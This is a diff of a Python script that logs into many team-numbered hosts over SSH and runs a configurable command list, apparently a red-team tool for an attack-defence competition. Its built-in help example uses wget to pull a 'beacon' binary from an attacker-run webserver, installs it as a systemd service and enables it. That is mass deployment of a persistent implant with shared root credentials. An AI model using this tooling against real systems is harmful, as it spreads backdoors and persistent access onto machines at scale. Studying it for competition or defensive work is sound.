@@ -20,33 +20,71 @@ COMMANDS = [
 SERVER = "10.0.4.25"
 WEBDIR = os.path.join(os.path.dirname(__file__), 'files')
 
-parser = argparse.ArgumentParser(description="Linux Deployment via SSH")
+parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
+description="""
+Linux Deployment via SSH and HTTP. Given a directory, this script will stand up a temproary
+webserver to host files and can use that webserver to pull down files via SSH. You must
+edit the file to manually edit the COMMANDS, SERVER, WEBDIR variables.
+
+Example:
+        Deploy a Linux Service remotely to teams 1,4,7 on hosts 3,5,22, given elevated
+        credetnials root:Sup3rS3cure! on the network topology of 10.[TeamNumber].20.[Host]
+
+        $ python3 linux-deploy.py --teams=1,4,7 --hosts 3,5,22 root Sup3rS3cure! 10.X.20.Y
+
+        cat linux-deploy.py
+        ... SNIP ...
+        COMMANDS = [
+            "wget http://10.0.4.25/cool_beacon -O /usr/bin/beacon_binary",
+            "wget http://10.0.4.25/unit_file -O /usr/lib/systemd/system/beacon.service",
+            "chmod +x /usr/bin/beacon_binary",
+            "systemctl enable beacon",
+            "systemctl start beacon"
+        ]
+        SERVER = "10.0.4.25"
+        WEBDIR = os.path.join(os.path.dirname(__file__), 'files')
+        ... SNIP ....
+
+""")
 parser.add_argument("username", type=str)
 parser.add_argument("password", type=str)
-parser.add_argument("cidr", type=str, nargs='+', help="CIDR notation of addreses. Use X for placeholder for team number, Y for host placeholder")
-parser.add_argument("--teams", type=int, nargs=1)
-parser.add_argument("--hosts", type=str, nargs=1)
-parser.add_argument("--threads", type=int, nargs=1, default=5)
-parser.add_argument("--single", action="store_true")
-args = parser.parse_args()
-if args.hosts:
-    args.hosts = args.hosts[0].split(',')
+parser.add_argument("targets", type=str, nargs='+', help="Addresses to deploy to. (e.g 10.X.2.Y or 10.4.5.10)")
+parser.add_argument("--teams", type=str, nargs=1, default="1", help="The number of teams. Will replace X with (e.g 1,2,4,9)")
+parser.add_argument("--hosts", type=str, nargs=1, default="1", help="The specific host numbers. Will replace Y. (e.g 1,2,4,8,20)")
+parser.add_argument("--threads", type=int, nargs=1, default=5, help="The number of workers to use to deploy")
+parser.add_argument("--specific", action="store_true", help="Don't use variables in addreses, interpet as literals")
+parser.add_argument("--check", action="store_true", help="View the targets to confirm before deployment. Will not run commands.")
 
-# Generate the IP addresses that we're going to need to deploy on
-team_number = re.compile(r"[xX]")
-host_number = re.compile(r"[yY]")
-addresses = []
+def process_args():
+    global addresses
+    global args
 
-# If we just want to deploy on one host just use --single argument
-if not args.single:
-    for addr in args.cidr:
-        for team in range(args.teams[0] + 1):
-            for i in args.hosts:
-                out = team_number.sub(str(team), addr)
-                out = host_number.sub(i, out)
-                addresses.append(out)
-else:
-    addresses = args.cidr
+    args = parser.parse_args()
+    # Split the hosts and teams to proper lists
+    if args.hosts:
+        args.hosts = args.hosts[0].split(',')
+    if args.teams:
+        args.teams = args.teams[0].split(',')
+
+
+    # Generate targets from specifications
+    addresses = []
+    if args.specific:
+        # If we provide specific IPs without ranges, we need to use --specific
+        addresses = args.targets
+    else:
+        # Otherwise we want to replae
+        team_number = re.compile(r"[xX]")
+        host_number = re.compile(r"[yY]")
+        for addr in args.targets:
+            for team in args.teams:
+                for host in args.hosts:
+                    # Substitute X placeholder for the team numbers
+                    out = team_number.sub(str(team), addr)
+                    # Substitute Y placeholder for specific hosts
+                    out = host_number.sub(host, out)
+                    if out not in addresses:
+                        addresses.append(out)
 
 def deploy(host, username, password):
     try:
@@ -68,21 +106,17 @@ def deploy(host, username, password):
     except paramiko.SSHException as e:
         return 1, str(e)
 
-def failure(output): print("\033[91m {}\033[00m" .format(output)) 
-def success(output): print("\033[92m {}\033[00m" .format(output)) 
-
-class SilentWebserver(SimpleHTTPRequestHandler):
-    def log_message(self, format, *args):
-        return 
-
-if __name__ == "__main__":
-    pid = os.fork()
+def run():
+    if WEBDIR:
+        pid = os.fork()
+    else:
+        pid = 1 # We don't need the webserver if its None, skip
 
     # Child process will handle standing up webserver
     if pid == 0:
         try:
             # Stand up the webserver to host the binary and service file
-            print(f"[STATUS] Starting Webserver...")
+            print(f"[STATUS] Serving {WEBDIR} @ {SERVER}:80...")
             httpd = TCPServer((SERVER, 80), SilentWebserver)
             os.chdir(WEBDIR)
             server_process = Process(target=httpd.serve_forever)
@@ -116,3 +150,19 @@ if __name__ == "__main__":
         # Stop the webserver
         os.kill(pid, signal.SIGKILL)
 
+def failure(output): print(f"\033[91m {output}\033[00m") 
+
+def success(output): print(f"\033[92m {output}\033[00m") 
+
+class SilentWebserver(SimpleHTTPRequestHandler):
+    def log_message(self, format, *args):
+        return 
+
+if __name__ == "__main__":
+    process_args()
+    if args.check:
+        print("Targets: ")
+        for t in addresses:
+            print(f"\t{t}")
+    else:
+        run()
